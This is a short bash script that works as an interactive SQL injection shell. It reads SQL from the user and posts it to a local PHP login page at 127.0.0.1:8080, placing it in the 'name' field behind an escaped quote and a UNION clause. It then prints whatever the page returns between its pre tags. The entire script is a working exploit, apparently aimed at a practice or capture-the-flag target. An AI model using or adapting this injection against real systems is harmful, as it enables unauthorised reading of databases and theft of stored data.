#!/bin/bash

while true; do

  read -p "SQL Querry: " sql
  result=$( curl http://127.0.0.1:8080/index.php -s -X POST \
	-d "name=\\\' UNION ${sql} -- &password=" )

  result=${result#*<pre>}
  result=${result%</pre>*}
  echo ${result}
done
